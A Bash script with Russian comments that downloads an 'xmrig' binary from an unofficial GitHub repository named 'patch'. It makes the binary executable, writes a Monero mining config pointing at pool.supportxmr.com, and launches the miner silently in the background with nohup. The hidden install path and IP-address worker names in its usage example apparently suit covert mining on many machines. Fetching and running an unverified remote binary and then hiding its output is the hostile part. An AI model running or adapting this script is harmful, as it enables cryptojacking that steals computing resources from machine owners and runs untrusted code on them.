#!/bin/bash

set -e # Прерывать выполнение при любой ошибке

# --- Аргументы ---
BINARY_PATH=$1
LOG_FILE_NAME=$2
WALLET=$3
WORKER_NAME=$4

# --- Конфигурация ---
API_PORT="60001" # Порт для API, который будет слушать Python-скрипт

echo "MoneroOcean simplified setup script."
echo "Arguments: BINARY_PATH=$BINARY_PATH, LOG_FILE_NAME=$LOG_FILE_NAME, WALLET=$WALLET, WORKER_NAME=$WORKER_NAME"
echo

# --- Проверки ---
if [ -z "$BINARY_PATH" ] || [ -z "$LOG_FILE_NAME" ] || [ -z "$WALLET" ] || [ -z "$WORKER_NAME" ]; then
  echo "ERROR: Usage: $0 <binary_path> <log_file_name> <wallet_address> <worker_name>"
  echo "Example: $0 /home/user/.local/bin/xmr_inst xmrig.log 4Ab...123.123.123.123 123.123.123.123"
  exit 1
fi

if ! type curl >/dev/null 2>&1; then
  echo "ERROR: This script requires 'curl' to work."
  exit 1
fi

INSTALL_DIR=$(dirname "$BINARY_PATH")
CONFIG_FILE="$INSTALL_DIR/config.json"
LOG_FILE_PATH="$INSTALL_DIR/$LOG_FILE_NAME"

# --- Подготовка ---
# Удаляем старый бинарник, если он есть (новая версия будет загружена)
rm -f "$BINARY_PATH"

# --- Загрузка и распаковка ---

echo "[*] Downloading xmrig to $BINARY_PATH"
curl -L --progress-bar "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/xmrig" -o "$BINARY_PATH"


if chmod +x -- "$BINARY_PATH"; then
  echo "made executable: $BINARY_PATH"
else
  echo "cant make executable $BINARY_PATH" >&2
  exit 4
fi
# --- Конфигурирование ---

echo "[*] Creating config file $CONFIG_FILE..."


API_TOKEN='xmrig_secret'
# Используем cat для создания файла с многострочным содержимым
# и вставляем нужные значения напрямую
cat << EOF > "$CONFIG_FILE"
{
    "api": {
        "port": $API_PORT,
        "access-token": "$API_TOKEN",
        "restricted": false,
        "host": "127.0.0.1",
        "ipv6": false,
        "restricted-ipv6": false,
        "port-hua": 0
    },
    "http": {
        "enabled": true,
        "host": "127.0.0.1",
        "port": $API_PORT,
        "access-token": "$API_TOKEN",
        "restricted": false
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": 4,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 1,
    "donate-over-proxy": 1,
    "log-file": "$LOG_FILE_PATH",
    "pools": [
        {
            "url": "pool.supportxmr.com:3333",
            "user": "$WALLET",
            "pass": "$WORKER_NAME",
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ip_version": 0,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF

echo "[*] Config file $CONFIG_FILE created and configured."

echo
echo "[*] Setup complete. Miner is ready to be started."
echo "    - Executable: $BINARY_PATH"
echo "    - Config: $CONFIG_FILE"
echo "    - Log: $LOG_FILE_PATH"
echo "    - API: http://127.0.0.1:$API_PORT/"
echo

# --- Запуск ---
# Запускаем XMRig в фоне, передав ему путь к конфигурационному файлу
# и убедившись, что он запускается в нужной директории (для логов)
cd "$INSTALL_DIR"
nohup "$BINARY_PATH" > /dev/null 2>&1 &

echo "[*] XMRig miner started in background."
echo "    You can check the logs with: tail -f $LOG_FILE_PATH"
echo "    You can check the API status with: curl http://127.0.0.1:$API_PORT/"
